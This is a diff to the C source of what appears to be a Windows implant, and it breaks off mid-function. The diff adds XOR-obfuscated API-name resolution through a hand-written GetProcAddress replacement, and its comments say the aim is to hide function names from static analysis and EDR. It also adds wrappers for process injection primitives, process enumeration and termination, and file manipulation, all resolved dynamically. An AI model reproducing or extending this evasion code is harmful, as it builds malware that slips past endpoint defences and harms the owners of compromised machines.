@@ -4,6 +4,7 @@
 #include <stdlib.h>
 #include <windows.h>
 #include <wininet.h>
+#include <tlhelp32.h> // For CreateToolhelp32Snapshot, Process32First, Process32Next
 
 // futureu notes:
 
@@ -124,6 +125,27 @@ typedef BOOL(WINAPI* HttpSendRequestA_t)(HINTERNET, LPCSTR, DWORD, LPVOID, DWORD
 typedef HINTERNET(WINAPI* InternetConnectA_t)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
 typedef HINTERNET(WINAPI* HttpOpenRequestA_t)(HINTERNET, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR*, DWORD, DWORD_PTR);
 typedef int (WINAPI *MessageBoxA_t)(HWND, LPCSTR, LPCSTR, UINT);
+
+typedef HANDLE(WINAPI *OpenProcess_t)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
+typedef BOOL(WINAPI *TerminateProcess_t)(HANDLE hProcess, UINT uExitCode);
+typedef DWORD(WINAPI *SuspendThread_t)(HANDLE hThread);
+typedef DWORD(WINAPI *FormatMessageA_t)(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list *Arguments);
+typedef HANDLE(WINAPI *CreateToolhelp32Snapshot_t)(DWORD dwFlags, DWORD th32ProcessID);
+typedef BOOL(WINAPI *Process32First_t)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
+typedef BOOL(WINAPI *Process32Next_t)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
+typedef DWORD(WINAPI *GetFileSize_t)(HANDLE hFile, LPWORD lpFileSizeHigh);
+typedef BOOL(WINAPI *DeleteFileA_t)(LPCSTR lpFileName);
+typedef BOOL(WINAPI *WriteFile_t)(HANDLE hFile, const void *lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
+typedef BOOL(WINAPI *MoveFileA_t)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName);
+typedef BOOL(WINAPI *CopyFileA_t)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
+typedef HANDLE(WINAPI *FindFirstFileW_t)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
+typedef BOOL(WINAPI *FindNextFileW_t)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
+typedef BOOL(WINAPI *FindClose_t)(HANDLE hFindFile);
+typedef BOOL(WINAPI *SetCurrentDirectoryA_t)(LPCSTR lpPathName);
+typedef BOOL(WINAPI *CreateDirectoryA_t)(LPCSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
+typedef BOOL(WINAPI *RemoveDirectoryA_t)(LPCSTR lpPathName);
+typedef DWORD(WINAPI *GetCurrentDirectoryA_t)(DWORD nBufferLength, LPSTR lpBuffer); // From the previous example
+typedef HANDLE(WINAPI *CreateFileA_t)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
 
 // -------------------------------------
 // Useful Notes ------------------------
@@ -332,9 +354,18 @@ If the function cannot be found, each func can look it up:
 // WhisperApi Funcs ---------------------------
 // --------------------------------------------
 
-FARPROC ResolveFunction(const wchar_t* module_name, const char* function_name)
+void XorText(char *text, char key) {
+    size_t len = strlen(text);
+    for (size_t i = 0; i < len; i++) {
+        text[i] = text[i] ^ key;  // XOR each character with key (not doing index)
+    }
+}
+
+
+FARPROC ResolveFunction(const wchar_t* module_name, const BYTE* function_name)
 {
-    DEBUG_LOG("[+] Attempting to resolve function %s\n", function_name);
+    DEBUG_LOG("[+] Attempting to resolve function: %s\n", function_name);
+
     HMODULE hModule = GetModuleHandleW(module_name);
     if (!hModule) {
         DEBUG_LOG("[!] GetModuleHandleW failed, trying LoadLibraryW.\n");
@@ -348,13 +379,130 @@ FARPROC ResolveFunction(const wchar_t* module_name, const char* function_name)
 
     DEBUG_LOGW(L"[+] Successful handle to %ls \n", module_name);
 
-    FARPROC pFunc = GetProcAddress(hModule, function_name);
+    // Attempt function resolution
+    FARPROC pFunc = GetProcAddressReplacement(hModule, function_name);
     if (!pFunc) {
-        DEBUG_LOG("[-] GetProcAddress failed for %s. Error=%lu.\n", function_name, GetLastError());
+        DEBUG_LOG("[-] GetProcAddressReplacement failed for %s. Error=%lu.\n", function_name, GetLastError());
         return NULL;
     }
 
     return pFunc;
+}
+
+
+FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpFuncNameXor) {
+    /*
+        (Modified) Drop-in replacement for GetProcAddress, adapted from MalDev.
+
+        ## Purpose:
+        This function takes a handle to a DLL (`hModule`) and an **XOR-obfuscated** function name (`lpFuncNameXor`).
+        It iterates through the module's exported functions, **XORs each function name**, and compares it 
+        to `lpFuncNameXor`. If a match is found, it returns the function's address.
+
+        ## Why XOR the function name?
+        Normally, calling `ResolveFunction("kernel32.dll", "MessageBoxA")` leaves function names 
+        as **plaintext in the binary**, making them visible in tools like `strings` or static analysis.
+        By XOR-ing function names, we **obfuscate them**, keeping them out of memory and the binary, 
+        making direct function name detection harder.
+
+        Example:
+            key = 0x10
+            MessageBoxA =[XOR]=> `]uccqwuRhQ` 
+                HEX: `0x5d,0x75,0x63,0x63,0x71,0x77,0x75,0x52,0x7f,0x68,0x51`
+
+            (assuming we are also searching for MessageBoxA)
+            CHAR* pFunctionName =[XOR]=> `]uccqwuRhQ`
+
+            `]uccqwuRhQ` == `]uccqwuRhQ`, so return address of this function.
+
+
+        ## Parameters:
+        - `hModule` (HMODULE): Handle to the loaded DLL containing the target function.
+        - `lpFuncNameXor` (LPCSTR): The **XOR-encrypted function name** to search for.
+
+        ## Returns:
+        - The function's address (`FARPROC`) if found.
+        - `NULL` if the function is not found.
+
+        ## Notes:
+        - This does **not** decrypt function names, it simply **compares XOR’d names** to avoid plaintext function names.
+        - Running `strings` on the binary will no longer reveal function names like `"MessageBoxA"`.
+
+    */
+	// We do this to avoid casting at each time we use 'hModule'
+	PBYTE pBase = (PBYTE)hModule;
+	
+	// Getting the dos header and doing a signature check
+	PIMAGE_DOS_HEADER	pImgDosHdr		= (PIMAGE_DOS_HEADER)pBase;
+	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) 
+		return NULL;
+	
+	// Getting the nt headers and doing a signature check
+	PIMAGE_NT_HEADERS	pImgNtHdrs		= (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
+	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) 
+		return NULL;
+
+	// Getting the optional header
+	IMAGE_OPTIONAL_HEADER	ImgOptHdr	= pImgNtHdrs->OptionalHeader;
+
+	// Getting the image export table
+	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY) (pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+	// Getting the function's names array pointer
+	PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
+	
+	// Getting the function's addresses array pointer
+	PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
+	
+	// Getting the function's ordinal array pointer
+	PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);
+
+	// Looping through all the exported functions
+	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++){
+		
+		// Getting the name of the function (read only)
+        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
+
+		// Getting the address of the function through its ordinal
+		PVOID pFunctionAddress	= (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
+
+        //setup func name to be XOR'd
+        size_t pFunctionName_Length = strlen(pFunctionName);
+        BYTE* pFunctionNameXor = (BYTE*)malloc(pFunctionName_Length + 1); // +1 for \0 safety
+        if (!pFunctionNameXor) return NULL;
+        memcpy(pFunctionNameXor, pFunctionName, pFunctionName_Length);
+
+        // Copy original name before XOR-ing
+        memcpy(pFunctionNameXor, pFunctionName, pFunctionName_Length + 1);
+
+        // DEBUG_LOG("Original function name: %s\n", pFunctionName);
+        // DEBUG_LOG("Function name XOR key: 0x%X\n", FUNC_ENCRYPTED_NAME_KEY);
+
+        //XOR pFuncName, to use for comparison below
+        for (size_t j = 0; j < pFunctionName_Length; j++) {
+            pFunctionNameXor[j] ^= FUNC_ENCRYPTED_NAME_KEY;
+        }
+
+        // DEBUG_LOG("XOR'd function name: %s\n", pFunctionNameXor);
+
+        //compare lpFuncName, and pFunctionNameXor, which are now both XOR'd.
+        if (memcmp(lpFuncNameXor, pFunctionNameXor, pFunctionName_Length) == 0) {
+			DEBUG_LOG("[ %0.4d ] FOUND API -\t NAME: %s -\t ADDRESS: 0x%p  -\t ORDINAL: %d\n", i, pFunctionName, pFunctionAddress, FunctionOrdinalArray[i]);
+	        //call a secure free (instead of regular free) to 0 out the memory where the XOR func name was stored, just in case
+            //an EDR gets smart and tries to brute force the XOR value
+            //SecureFree(pFunctionNameXor, strlen(pFunctionNameXor));
+            //SecureFree(pFunctionNameXor, pFunctionName_Length);
+
+            return pFunctionAddress;
+		}
+        
+        //free no matter what
+        //maybe move to secure free? Prolly not a big deal, it's still XOR'd
+        free(pFunctionNameXor);
+
+	}
+
+	return NULL;
 }
 
 // --------------------------------------------
@@ -384,7 +532,7 @@ BOOL WhisperCreateProcessA(
     DEBUG_LOG("[FUNC_CALL] WhisperCreateProcessA\n");
 
     if (!pCreateProcessA) {
-        pCreateProcessA = (CreateProcessA_t)ResolveFunction(L"kernel32.dll", "CreateProcessA");
+        pCreateProcessA = (CreateProcessA_t)ResolveFunction(L"kernel32.dll", FUNC_CreateProcessA_ENCRYPTED_NAME);
         if (!pCreateProcessA)
             return FALSE;
     }
@@ -406,7 +554,7 @@ HANDLE WhisperCreateThread(
     DEBUG_LOG("[FUNC_CALL] WhisperCreateThread\n");
 
     if (!pCreateThread) {
-        pCreateThread = (CreateThread_t)ResolveFunction(L"kernel32.dll", "CreateThread");
+        pCreateThread = (CreateThread_t)ResolveFunction(L"kernel32.dll", FUNC_CreateThread_ENCRYPTED_NAME);
         if (!pCreateThread)
             return NULL;
     }
@@ -414,13 +562,13 @@ HANDLE WhisperCreateThread(
     return pCreateThread(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
 }
 
+
 static ResumeThread_t pResumeThread = NULL;
 DWORD WhisperResumeThread(HANDLE hThread)
 {
     DEBUG_LOG("[FUNC_CALL] WhisperResumeThread\n");
-
     if (!pResumeThread) {
-        pResumeThread = (ResumeThread_t)ResolveFunction(L"kernel32.dll", "ResumeThread");
+        pResumeThread = (ResumeThread_t)ResolveFunction(L"kernel32.dll", FUNC_ResumeThread_ENCRYPTED_NAME);
         if (!pResumeThread)
             return -1;
     }
@@ -438,7 +586,7 @@ LPVOID WhisperVirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, D
     DEBUG_LOG("[FUNC_CALL] WhisperVirtualAllocEx\n");
 
     if (!pVirtualAllocEx) {
-        pVirtualAllocEx = (VirtualAllocEx_t)ResolveFunction(L"kernel32.dll", "VirtualAllocEx");
+        pVirtualAllocEx = (VirtualAllocEx_t)ResolveFunction(L"kernel32.dll", FUNC_VirtualAllocEx_ENCRYPTED_NAME);
         if (!pVirtualAllocEx)
             return NULL;
     }
@@ -450,9 +598,8 @@ static WriteProcessMemory_t pWriteProcessMemory = NULL;
 BOOL WhisperWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten)
 {
     DEBUG_LOG("[FUNC_CALL] WhisperWriteProcessMemory\n");
-
     if (!pWriteProcessMemory) {
-        pWriteProcessMemory = (WriteProcessMemory_t)ResolveFunction(L"kernel32.dll", "WriteProcessMemory");
+        pWriteProcessMemory = (WriteProcessMemory_t)ResolveFunction(L"kernel32.dll", FUNC_WriteProcessMemory_ENCRYPTED_NAME);
         if (!pWriteProcessMemory)
             return FALSE;
     }
@@ -468,9 +615,8 @@ static CreatePipe_t pCreatePipe = NULL;
 BOOL WhisperCreatePipe(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize)
 {
     DEBUG_LOG("[FUNC_CALL] WhisperCreatePipe\n");
-
     if (!pCreatePipe) {
-        pCreatePipe = (CreatePipe_t)ResolveFunction(L"kernel32.dll", "CreatePipe");
+        pCreatePipe = (CreatePipe_t)ResolveFunction(L"kernel32.dll", FUNC_CreatePipe_ENCRYPTED_NAME);
         if (!pCreatePipe)
             return FALSE;
     }
@@ -482,9 +628,8 @@ static SetHandleInformation_t pSetHandleInformation = NULL;
 BOOL WhisperSetHandleInformation(HANDLE hObject, DWORD dwMask, DWORD dwFlags)
 {
     DEBUG_LOG("[FUNC_CALL] WhisperSetHandleInformation\n");
-
     if (!pSetHandleInformation) {
-        pSetHandleInformation = (SetHandleInformation_t)ResolveFunction(L"kernel32.dll", "SetHandleInformation");
+        pSetHandleInformation = (SetHandleInformation_t)ResolveFunction(L"kernel32.dll", FUNC_SetHandleInformation_ENCRYPTED_NAME);
         if (!pSetHandleInformation)
             return FALSE;
     }
@@ -498,7 +643,7 @@ BOOL WhisperCloseHandle(HANDLE hObject)
     DEBUG_LOG("[FUNC_CALL] WhisperCloseHandle\n");
 
     if (!pCloseHandle) {
-        pCloseHandle = (CloseHandle_t)ResolveFunction(L"kernel32.dll", "CloseHandle");
+        pCloseHandle = (CloseHandle_t)ResolveFunction(L"kernel32.dll", FUNC_CloseHandle_ENCRYPTED_NAME);
         if (!pCloseHandle)
             return FALSE;
     }
@@ -516,7 +661,7 @@ HINTERNET WhisperInternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpsz
     DEBUG_LOG("[FUNC_CALL] WhisperInternetOpenA\n");
 
     if (!pInternetOpenA) {
-        pInternetOpenA = (InternetOpenA_t)ResolveFunction(L"wininet.dll", "InternetOpenA");
+        pInternetOpenA = (InternetOpenA_t)ResolveFunction(L"wininet.dll", FUNC_InternetOpenA_ENCRYPTED_NAME);
         if (!pInternetOpenA)
             return NULL;
     }
@@ -538,7 +683,7 @@ HINTERNET WhisperInternetConnectA(
     DEBUG_LOG("[FUNC_CALL] WhisperInternetConnectA\n");
 
     if (!pInternetConnectA) {
-        pInternetConnectA = (InternetConnectA_t)ResolveFunction(L"wininet.dll", "InternetConnectA");
+        pInternetConnectA = (InternetConnectA_t)ResolveFunction(L"wininet.dll", FUNC_InternetConnectA_ENCRYPTED_NAME);
         if (!pInternetConnectA)
             return NULL;
     }
@@ -560,7 +705,7 @@ HINTERNET WhisperHttpOpenRequestA(
     DEBUG_LOG("[FUNC_CALL] WhisperHttpOpenRequestA\n");
 
     if (!pHttpOpenRequestA) {
-        pHttpOpenRequestA = (HttpOpenRequestA_t)ResolveFunction(L"wininet.dll", "HttpOpenRequestA");
+        pHttpOpenRequestA = (HttpOpenRequestA_t)ResolveFunction(L"wininet.dll", FUNC_HttpOpenRequestA_ENCRYPTED_NAME);
         if (!pHttpOpenRequestA)
             return NULL;
     }
@@ -572,9 +717,8 @@ static HttpSendRequestA_t pHttpSendRequestA = NULL;
 BOOL WhisperHttpSendRequestA(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength)
 {
     DEBUG_LOG("[FUNC_CALL] WhisperHttpSendRequestA\n");
-
     if (!pHttpSendRequestA) {
-        pHttpSendRequestA = (HttpSendRequestA_t)ResolveFunction(L"wininet.dll", "HttpSendRequestA");
+        pHttpSendRequestA = (HttpSendRequestA_t)ResolveFunction(L"wininet.dll", FUNC_HttpSendRequestA_ENCRYPTED_NAME);
         if (!pHttpSendRequestA)
             return FALSE;
     }
@@ -588,7 +732,7 @@ HINTERNET WhisperInternetOpenUrlW(HINTERNET hInternet, LPCWSTR lpszUrl, LPCWSTR 
     DEBUG_LOG("[FUNC_CALL] WhisperInternetOpenUrlW\n");
 
     if (!pInternetOpenUrlW) {
-        pInternetOpenUrlW = (InternetOpenUrlW_t)ResolveFunction(L"wininet.dll", "InternetOpenUrlW");
+        pInternetOpenUrlW = (InternetOpenUrlW_t)ResolveFunction(L"wininet.dll", FUNC_InternetOpenUrlW_ENCRYPTED_NAME);
         if (!pInternetOpenUrlW)
             return NULL;
     }
@@ -602,7 +746,7 @@ BOOL WhisperInternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfB
     DEBUG_LOG("[FUNC_CALL] WhisperInternetReadFile\n");
 
     if (!pInternetReadFile) {
-        pInternetReadFile = (InternetReadFile_t)ResolveFunction(L"wininet.dll", "InternetReadFile");
+        pInternetReadFile = (InternetReadFile_t)ResolveFunction(L"wininet.dll", FUNC_InternetReadFile_ENCRYPTED_NAME);
         if (!pInternetReadFile)
             return FALSE;
     }
@@ -614,9 +758,8 @@ static InternetCloseHandle_t pInternetCloseHandle = NULL;
 BOOL WhisperInternetCloseHandle(HINTERNET hInternet)
 {
     DEBUG_LOG("[FUNC_CALL]WhisperInternetCloseHandle\n");
-
     if (!pInternetCloseHandle) {
-        pInternetCloseHandle = (InternetCloseHandle_t)ResolveFunction(L"wininet.dll", "InternetCloseHandle");
+        pInternetCloseHandle = (InternetCloseHandle_t)ResolveFunction(L"wininet.dll", FUNC_InternetCloseHandle_ENCRYPTED_NAME);
         if (!pInternetCloseHandle)
             return FALSE;
     }
@@ -634,7 +777,7 @@ BOOL WhisperGetUserNameW(LPWSTR lpBuffer, LPDWORD pcbBuffer)
     DEBUG_LOG("[FUNC_CALL] WhisperGetUserNameW\n");
 
     if (!pGetUserNameW) {
-        pGetUserNameW = (GetUserNameW_t)ResolveFunction(L"Advapi32.dll", "GetUserNameW");
+        pGetUserNameW = (GetUserNameW_t)ResolveFunction(L"Advapi32.dll", FUNC_GetUserNameW_ENCRYPTED_NAME);
         if (!pGetUserNameW)
             return FALSE;
     }
@@ -647,18 +790,20 @@ BOOL WhisperGetUserNameW(LPWSTR lpBuffer, LPDWORD pcbBuffer)
 // =====================================
 
 static Sleep_t pSleep = NULL;
+
 void WhisperSleep(DWORD dwMilliseconds)
 {
     DEBUG_LOG("[FUNC_CALL] WhisperSleep\n");
 
     if (!pSleep) {
-        pSleep = (Sleep_t)ResolveFunction(L"kernel32.dll", "Sleep");
+        pSleep = (Sleep_t)ResolveFunction(L"kernel32.dll", FUNC_Sleep_ENCRYPTED_NAME);
         if (!pSleep)
             return;
     }
 
     pSleep(dwMilliseconds);
 }
+
 
 // =====================================
 //  SYNCHRONIZATION FUNCTIONS
@@ -670,7 +815,7 @@ DWORD WhisperWaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds)
     DEBUG_LOG("[FUNC_CALL] WhisperWaitForSingleObject\n");
 
     if (!pWaitForSingleObject) {
-        pWaitForSingleObject = (WaitForSingleObject_t)ResolveFunction(L"kernel32.dll", "WaitForSingleObject");
+        pWaitForSingleObject = (WaitForSingleObject_t)ResolveFunction(L"kernel32.dll", FUNC_WaitForSingleObject_ENCRYPTED_NAME);
         if (!pWaitForSingleObject)
             return WAIT_FAILED;
     }
@@ -678,23 +823,6 @@ DWORD WhisperWaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds)
     return pWaitForSingleObject(hHandle, dwMilliseconds);
 }
 
-// =====================================
-//  FILE MANAGEMENT
-// =====================================
-
-static ReadFile_t pReadFile = NULL;
-BOOL WhisperReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)
-{
-    DEBUG_LOG("[FUNC_CALL] WhisperReadFile\n");
-
-    if (!pReadFile) {
-        pReadFile = (ReadFile_t)ResolveFunction(L"kernel32.dll", "ReadFile");
-        if (!pReadFile)
-            return FALSE;
-    }
-
-    return pReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);
-}
 
 // Misc
 
@@ -705,12 +833,204 @@ int WhisperMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)
     DEBUG_LOG("[FUNC_CALL] WhisperMessageBoxA\n");
 
     if (!pMessageBoxA) {
-        pMessageBoxA = (MessageBoxA_t)ResolveFunction(L"user32.dll", "MessageBoxA");
-        if (!pMessageBoxA)
-            return 0;
+            pMessageBoxA = (MessageBoxA_t)ResolveFunction(L"user32.dll", FUNC_MessageBoxA_ENCRYPTED_NAME);
+            if (!pMessageBoxA) {
+                return FALSE;
+            }
     }
 
+
     return pMessageBoxA(hWnd, lpText, lpCaption, uType);
+}
+
+// New Funcs
+static OpenProcess_t pOpenProcess = NULL;
+HANDLE WhisperOpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) {
+    if (!pOpenProcess) {
+        pOpenProcess = (OpenProcess_t)ResolveFunction(L"kernel32.dll", FUNC_OpenProcess_ENCRYPTED_NAME);
+        if (!pOpenProcess) return NULL;
+    }
+    return pOpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
+}
+
+static TerminateProcess_t pTerminateProcess = NULL;
+BOOL WhisperTerminateProcess(HANDLE hProcess, UINT uExitCode) {
+    if (!pTerminateProcess) {
+        pTerminateProcess = (TerminateProcess_t)ResolveFunction(L"kernel32.dll", FUNC_TerminateProcess_ENCRYPTED_NAME);
+        if (!pTerminateProcess) return FALSE;
+    }
+    return pTerminateProcess(hProcess, uExitCode);
+}
+
+static SuspendThread_t pSuspendThread = NULL;
+DWORD WhisperSuspendThread(HANDLE hThread) {
+    if (!pSuspendThread) {
+        pSuspendThread = (SuspendThread_t)ResolveFunction(L"kernel32.dll", FUNC_SuspendThread_ENCRYPTED_NAME);
+        if (!pSuspendThread) return (DWORD)-1; // Or appropriate error code
+    }
+    return pSuspendThread(hThread);
+}
+
+static FormatMessageA_t pFormatMessageA = NULL;
+DWORD WhisperFormatMessageA(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list *Arguments) {
+    if (!pFormatMessageA) {
+        pFormatMessageA = (FormatMessageA_t)ResolveFunction(L"kernel32.dll", FUNC_FormatMessageA_ENCRYPTED_NAME);
+        if (!pFormatMessageA) return 0;
+    }
+    return pFormatMessageA(dwFlags, lpSource, dwMessageId, dwLanguageId, lpBuffer, nSize, Arguments);
+}
+
+static CreateToolhelp32Snapshot_t pCreateToolhelp32Snapshot = NULL;
+HANDLE WhisperCreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID) {
+    if (!pCreateToolhelp32Snapshot) {
+        pCreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t)ResolveFunction(L"kernel32.dll", FUNC_CreateToolhelp32Snapshot_ENCRYPTED_NAME);
+        if (!pCreateToolhelp32Snapshot) return INVALID_HANDLE_VALUE;
+    }
+    return pCreateToolhelp32Snapshot(dwFlags, th32ProcessID);
+}
+
+static Process32First_t pProcess32First = NULL;
+BOOL WhisperProcess32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) {
+    if (!pProcess32First) {
+        pProcess32First = (Process32First_t)ResolveFunction(L"kernel32.dll", FUNC_Process32First_ENCRYPTED_NAME);
+        if (!pProcess32First) return FALSE;
+    }
+    return pProcess32First(hSnapshot, lppe);
+}
+
+static Process32Next_t pProcess32Next = NULL;
+BOOL WhisperProcess32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) {
+    if (!pProcess32Next) {
+        pProcess32Next = (Process32Next_t)ResolveFunction(L"kernel32.dll", FUNC_Process32Next_ENCRYPTED_NAME);
+        if (!pProcess32Next) return FALSE;
+    }
+    return pProcess32Next(hSnapshot, lppe);
+}
+
+DWORD WhisperGetFileSize(HANDLE hFile, LPWORD lpFileSizeHigh) {
+    static GetFileSize_t pGetFileSize = NULL;
+    if (!pGetFileSize) {
+        pGetFileSize = (GetFileSize_t)ResolveFunction(L"kernel32.dll", FUNC_GetFileSize_ENCRYPTED_NAME);
+        if (!pGetFileSize) return INVALID_FILE_SIZE; // Or appropriate error
+    }
+    return pGetFileSize(hFile, lpFileSizeHigh);
+}
+
+BOOL WhisperReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped) {
+    static ReadFile_t pReadFile = NULL;
+    if (!pReadFile) {
+        pReadFile = (ReadFile_t)ResolveFunction(L"kernel32.dll", FUNC_ReadFile_ENCRYPTED_NAME);
+        if (!pReadFile) return FALSE;
+    }
+    return pReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);
+}
+
+BOOL WhisperDeleteFileA(LPCSTR lpFileName) {
+    static DeleteFileA_t pDeleteFileA = NULL;
+    if (!pDeleteFileA) {
+        pDeleteFileA = (DeleteFileA_t)ResolveFunction(L"kernel32.dll", FUNC_DeleteFileA_ENCRYPTED_NAME);
+        if (!pDeleteFileA) return FALSE;
+    }
+    return pDeleteFileA(lpFileName);
+}
+
+BOOL WhisperWriteFile(HANDLE hFile, const void *lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped) {
+    static WriteFile_t pWriteFile = NULL;
+    if (!pWriteFile) {
+        pWriteFile = (WriteFile_t)ResolveFunction(L"kernel32.dll",FUNC_WriteFile_ENCRYPTED_NAME);
+        if (!pWriteFile) return FALSE;
+    }
+    return pWriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
+}
+
+BOOL WhisperMoveFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName) {
+    static MoveFileA_t pMoveFileA = NULL;
+    if (!pMoveFileA) {
+        pMoveFileA = (MoveFileA_t)ResolveFunction(L"kernel32.dll",FUNC_MoveFileA_ENCRYPTED_NAME);
+        if (!pMoveFileA) return FALSE;
+    }
+    return pMoveFileA(lpExistingFileName, lpNewFileName);
+}
+
+BOOL WhisperCopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists) {
+    static CopyFileA_t pCopyFileA = NULL;
+    if (!pCopyFileA) {
+        pCopyFileA = (CopyFileA_t)ResolveFunction(L"kernel32.dll", FUNC_CopyFileA_ENCRYPTED_NAME);
+        if (!pCopyFileA) return FALSE;
+    }
+    return pCopyFileA(lpExistingFileName, lpNewFileName, bFailIfExists);
+}
+
+HANDLE WhisperFindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData) {
+    static FindFirstFileW_t pFindFirstFileW = NULL;
+    if (!pFindFirstFileW) {
+        pFindFirstFileW = (FindFirstFileW_t)ResolveFunction(L"kernel32.dll", FUNC_FindFirstFileW_ENCRYPTED_NAME);
+        if (!pFindFirstFileW) return INVALID_HANDLE_VALUE;
+    }
+    return pFindFirstFileW(lpFileName, lpFindFileData);
+}
+
+BOOL WhisperFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData) {
+    static FindNextFileW_t pFindNextFileW = NULL;
+    if (!pFindNextFileW) {
+        pFindNextFileW = (FindNextFileW_t)ResolveFunction(L"kernel32.dll", FUNC_FindNextFileW_ENCRYPTED_NAME);
+        if (!pFindNextFileW) return FALSE;
+    }
+    return pFindNextFileW(hFindFile, lpFindFileData);
+}
+
+BOOL WhisperFindClose(HANDLE hFindFile) {
+    static FindClose_t pFindClose = NULL;
+    if (!pFindClose) {
+        pFindClose = (FindClose_t)ResolveFunction(L"kernel32.dll", FUNC_FindClose_ENCRYPTED_NAME);
+        if (!pFindClose) return FALSE;
+    }
+    return pFindClose(hFindFile);
+}
+
+BOOL WhisperSetCurrentDirectoryA(LPCSTR lpPathName) {
+    static SetCurrentDirectoryA_t pSetCurrentDirectoryA = NULL;
+    if (!pSetCurrentDirectoryA) {
+        pSetCurrentDirectoryA = (SetCurrentDirectoryA_t)ResolveFunction(L"kernel32.dll", FUNC_SetCurrentDirectoryA_ENCRYPTED_NAME);
+        if (!pSetCurrentDirectoryA) return FALSE; // Or appropriate error code
+    }
+    return pSetCurrentDirectoryA(lpPathName);
+}
+
+BOOL WhisperCreateDirectoryA(LPCSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes) {
+    static CreateDirectoryA_t pCreateDirectoryA = NULL;
+    if (!pCreateDirectoryA) {
+        pCreateDirectoryA = (CreateDirectoryA_t)ResolveFunction(L"kernel32.dll",FUNC_CreateDirectoryA_ENCRYPTED_NAME);
+        if (!pCreateDirectoryA) return FALSE;
+    }
+    return pCreateDirectoryA(lpPathName, lpSecurityAttributes);
+}
+
+BOOL WhisperRemoveDirectoryA(LPCSTR lpPathName) {
+    static RemoveDirectoryA_t pRemoveDirectoryA = NULL;
+    if (!pRemoveDirectoryA) {
+        pRemoveDirectoryA = (RemoveDirectoryA_t)ResolveFunction(L"kernel32.dll", FUNC_RemoveDirectoryA_ENCRYPTED_NAME);
+        if (!pRemoveDirectoryA) return FALSE;
+    }
+    return pRemoveDirectoryA(lpPathName);
+}
+
+DWORD WhisperGetCurrentDirectoryA(DWORD nBufferLength, LPSTR lpBuffer) { // From the previous example
+    static GetCurrentDirectoryA_t pGetCurrentDirectoryA = NULL;
+    if (!pGetCurrentDirectoryA) {
